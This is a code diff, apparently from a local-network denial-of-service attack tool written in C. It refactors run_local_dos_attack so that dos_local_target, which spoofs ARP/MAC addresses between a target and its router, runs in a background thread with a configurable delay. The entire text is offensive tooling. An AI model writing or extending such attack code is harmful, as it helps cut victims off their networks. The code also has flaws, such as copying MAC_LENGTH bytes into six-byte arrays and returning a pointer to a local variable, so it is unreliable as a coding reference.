@@ -12,6 +12,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <malloc.h>
+#include <pthread.h>
 #include <linux/if_packet.h>
 #include <linux/if_ether.h>
 #include <linux/if_arp.h>
@@ -429,8 +430,41 @@ out:
     return ret;
 }
 
-int run_local_dos_attack(const char *interface, const char *target_ip, const char *router_ip, const char *spoof_ip, int spoof) {
+struct dos_thread_data {
+    char spoof_mac[6];
+    char router_mac[6];
+    const char *interface;
+    const char *target_ip;
+    const char *router_ip;
+    int delay;
+    int spoof;
+};
+
+void *dos_thread(void *thread_data) {
     int ret = -1;
+
+    debug("Attempting to run thread");
+
+    struct dos_thread_data *data = (struct dos_thread_data *)thread_data;
+
+    if(dos_local_target(data->spoof_mac, data->router_mac, data->interface,
+    data->target_ip, data->router_ip, data->delay, data->spoof) != 0) {
+        err("Failed to dos target");
+        goto out;
+    }
+
+    ret = 0;
+
+out:
+    pthread_exit(&ret);
+}
+
+struct dos_thread_data tdata;
+int run_local_dos_attack(const char *interface, const char *target_ip, const char *router_ip, const char *spoof_ip, int spoof, int delay, pthread_t *tid) {
+    int ret = -1;
+
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
 
     char target_mac[MAC_LENGTH];
     char router_mac[MAC_LENGTH];
@@ -454,12 +488,19 @@ int run_local_dos_attack(const char *interface, const char *target_ip, const cha
             err("Failed to find target mac address");
             goto out;
         }
+
+        memcpy(tdata.spoof_mac, spoof_mac, MAC_LENGTH);
     }
 
-    if(dos_local_target(spoof_mac, router_mac, interface, target_ip, router_ip, 1, spoof) != 0) {
-        err("Failed to dos target");
-        goto out;
-    }
+    tdata.delay = delay;
+    tdata.spoof = spoof;
+    tdata.interface = interface;
+    tdata.router_ip = router_ip;
+    tdata.target_ip = target_ip;
+
+    memcpy(tdata.router_mac, router_mac, MAC_LENGTH);
+
+    pthread_create(tid, &attr, dos_thread, &tdata);
 
     ret = 0;
 
